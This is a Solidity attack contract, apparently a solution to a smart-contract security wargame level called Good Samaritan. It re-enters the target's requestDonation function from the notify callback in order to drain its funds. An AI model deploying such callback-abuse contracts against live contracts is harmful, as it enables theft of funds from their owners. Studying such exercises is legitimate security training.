pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external;
}

contract RecursiveAttacker {
    IGoodSamaritan public goodSamaritan;

    constructor(address goodSamaritanAddress) {
        goodSamaritan = IGoodSamaritan(goodSamaritanAddress);
    }

    function notify(uint256 _amount) external {
        goodSamaritan.requestDonation();
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }
}